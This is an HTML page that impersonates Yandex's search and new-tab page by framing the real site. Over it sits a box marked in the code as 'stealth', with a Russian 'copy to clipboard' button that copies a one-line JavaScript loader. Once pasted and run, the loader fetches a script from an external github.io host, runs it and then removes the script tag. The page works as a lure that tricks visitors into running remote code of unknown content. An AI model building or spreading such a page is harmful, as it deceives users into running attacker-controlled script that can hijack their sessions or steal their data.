<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Яндекс — быстрый поиск в интернете</title>
  <link rel="icon" href="https://yandex.ru/favicon.ico">
  <link rel="shortcut icon" href="https://yandex.ru/favicon.ico">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #f4f4f4;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    }
    .yandex-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: 1;
    }
    .stealth-copy-box {
      position: fixed;
      bottom: 16px;
      left: 16px;
      z-index: 999999;
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(0, 0, 0, 0.15);
      border-radius: 8px;
      padding: 10px 12px;
      max-width: 480px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .code-preview {
      font-family: Consolas, "Courier New", monospace;
      font-size: 11px;
      line-height: 1.35;
      background: #f8f9fa;
      border: 1px solid #dee2e6;
      border-radius: 4px;
      padding: 6px 8px;
      color: #212529;
      word-break: break-all;
      user-select: all;
      cursor: pointer;
    }
    .copy-btn {
      background: #fc3f1d;
      color: #ffffff;
      border: none;
      border-radius: 6px;
      padding: 6px 14px;
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      transition: background 0.15s ease, transform 0.1s ease;
    }
    .copy-btn:hover {
      background: #e03212;
    }
    .copy-btn:active {
      transform: scale(0.98);
    }
    .copy-btn.copied {
      background: #00ba34;
    }
  </style>
</head>
<body>
  <iframe class="yandex-frame" src="https://yandex.ru/chrome/newtab" id="yandexFrame"></iframe>

  <div class="stealth-copy-box">
    <div class="code-preview" id="codeText" title="Нажмите, чтобы выделить и скопировать">s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)</div>
    <button class="copy-btn" id="copyBtn">
      <span>Скопировать в буфер</span>
    </button>
  </div>

  <script>
    const codeEl = document.getElementById('codeText');
    const copyBtn = document.getElementById('copyBtn');

    function doCopy() {
      const text = codeEl.innerText.trim();
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(showSuccess).catch(fallbackCopy);
      } else {
        fallbackCopy();
      }
    }

    function fallbackCopy() {
      const ta = document.createElement('textarea');
      ta.value = codeEl.innerText.trim();
      ta.style.position = 'fixed';
      ta.style.left = '-9999px';
      document.body.appendChild(ta);
      ta.select();
      try {
        document.execCommand('copy');
        showSuccess();
      } catch (err) {}
      document.body.removeChild(ta);
    }

    function showSuccess() {
      copyBtn.classList.add('copied');
      copyBtn.innerHTML = '<span>✓ Скопировано в буфер!</span>';
      setTimeout(() => {
        copyBtn.classList.remove('copied');
        copyBtn.innerHTML = '<span>Скопировать в буфер</span>';
      }, 2000);
    }

    copyBtn.addEventListener('click', doCopy);
    codeEl.addEventListener('click', doCopy);
  </script>
</body>
</html>
